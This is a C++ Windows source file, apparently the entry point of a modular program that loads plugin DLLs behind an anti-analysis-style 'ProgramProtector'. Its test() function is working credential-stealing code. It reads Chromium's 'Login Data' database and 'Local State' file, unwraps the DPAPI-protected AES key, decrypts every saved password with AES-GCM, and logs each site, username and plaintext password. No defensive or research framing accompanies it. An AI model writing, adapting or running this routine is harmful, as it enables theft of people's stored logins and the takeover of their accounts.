#include "Exception.hpp"
#include "FigException.hpp"
#include "FigModule.hpp"
#include "FigOperation.hpp"
#include "Json.hpp"
#include "Trace.hpp"
#include "Crypto/Aes.hpp"
#include "Crypto/Base64.hpp"
#include "Crypto/Protection.hpp"
#include "Filesystem/File.hpp"
#include "Protections/ProgramProtector.hpp"
#include "Sql/InMemorySqliteDatabase.hpp"
#include "Utils/Strings.hpp"

#include <Windows.h>

static void test();

int WINAPI wWinMain([[maybe_unused]] HINSTANCE hInstance,
                    [[maybe_unused]] HINSTANCE hPrevInstance,
                    [[maybe_unused]] PWSTR pCmdLine,
                    [[maybe_unused]] int nCmdShow)
{
	try
	{
		Protections::ProgramProtector protector;
		test();
		//main_logic();
		return EXIT_SUCCESS;
	}
	catch ([[maybe_unused]] const FigException& ex)
	{
		TRACE(
			"uncaught FigException with code ",
			ex.code(),
			" and FigCode ",
			static_cast<uint32_t>(ex.fig_code()),
			" and FigSpecificCode ",
			ex.fig_specific_code()
		);
	}
	CATCH_AND_TRACE()

	return EXIT_SUCCESS;
}

//static void main_logic()
//{
//	std::filesystem::path path = L"../"
//#ifdef _DEBUG
//		"Debug"
//#else
//		"Release"
//#endif
//		"/PrizePresenterFig.dll";
//	const auto fig = std::make_shared<FigModule>(path);
//	TRACE("fig id: ", fig->id(), " fig version: ", fig->major(), ".", fig->minor());
//	const Json parameters = {
//		{"path", R"(C:\Users\alper\OneDrive\Documents\new file.txt)"}
//	};
//	TRACE(L"json value: ", parameters.dump().c_str());
//	const std::unique_ptr<FigOperation> fig_operation = fig->execute(3, Strings::to_buffer(parameters.dump()));
//	bool is_over = false;
//	File output(
//		LR"(C:\Users\alper\OneDrive\Documents\more_output.txt)",
//		File::Mode::WRITE,
//		File::Disposition::OVERRIDE
//	);
//	while (!is_over)
//	{
//		const FigModule::StatusResult status = fig_operation->wait();
//		switch (status.execution_status)
//		{
//		case Fig::ExecutionStatus::FAILED:
//			TRACE(L"failed with fig code: ", status.fig_specific_code);
//			throw Exception(ErrorCode::FAILED_FIG_EXECUTE);
//		case Fig::ExecutionStatus::FINISHED:
//			is_over = true;
//			break;
//		case Fig::ExecutionStatus::EXECUTING:
//			continue;
//		case Fig::ExecutionStatus::EXECUTING_CAN_TAKE:
//			break;
//		}
//		Buffer data;
//		do
//		{
//			data = fig_operation->take();
//			output.write(data);
//		}
//		while (!data.empty());
//	}
//	TRACE("finished successfully");
//}

struct Credential final
{
	std::wstring origin;
	std::wstring username;
	std::wstring password;
};

using Credentials = std::vector<Credential>;

static Buffer parse_key(const std::string& encrypted_key)
{
	const Buffer key_with_prefix = Base64::decode(encrypted_key);
	static constexpr std::string_view PREFIX = "DPAPI";

	const Buffer protected_key = {key_with_prefix.begin() + PREFIX.size(), key_with_prefix.end()};
	return Crypto::unprotect_data(protected_key);
}

static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
{
	static constexpr std::string_view PREFIX = "v10";
	static constexpr size_t IV_LENGTH = 12;

	if (password.size() < PREFIX.size() + IV_LENGTH)
	{
		throw Exception(ErrorCode::INVALID_ARGUMENT);
	}

	const Buffer iv = {password.begin() + PREFIX.size(), password.begin() + PREFIX.size() + IV_LENGTH};
	const Buffer encrypted_password = {
		password.begin() + PREFIX.size() + IV_LENGTH,
		password.end()
	};

	return {iv, encrypted_password};
}

void test()
{
	const std::filesystem::path db_path = LR"(C:\Users\alper\Downloads\Login Data)";
	const std::filesystem::path local_state_path = LR"(C:\Users\alper\Downloads\Local State)";

	const InMemorySqliteDatabase database(File(db_path, File::Mode::READ, File::Disposition::OPEN).read());
	const Json json = Json::parse(File(local_state_path, File::Mode::READ, File::Disposition::OPEN).read());

	const auto aes_key = parse_key(json["os_crypt"]["encrypted_key"].get<std::string>());

	Credentials credentials;

	for (SqliteRowIterator iterator = database.iterate_query(
		     "SELECT origin_url, username_value, password_value FROM logins"
	     );
	     iterator.next();)
	{
		try
		{
			const SqliteRow row = iterator.current();
			const auto [origin_url, username_value, password_value] = as_tuple<std::wstring, std::wstring, std::string>(
				row
			);
			Buffer raw_encrypted_password = Strings::to_buffer(password_value);
			auto [iv, encrypted_password] = parse_password(raw_encrypted_password);
			const Buffer plaintext_password = decrypt(encrypted_password, aes_key, iv, Aes::Mode::GCM);

			credentials.emplace_back(
				origin_url,
				username_value,
				Strings::to_wstring(Strings::to_string(plaintext_password))
			);
		}
		CATCH_AND_TRACE()
	}

	for (const Credential& cred : credentials)
	{
		TRACE(
			L"origin_url: '",
			cred.origin.c_str(),
			L"', username_value: '",
			cred.username.c_str(),
			"', password_value: '",
			cred.password.c_str(),
			"'"
		);
	}
}
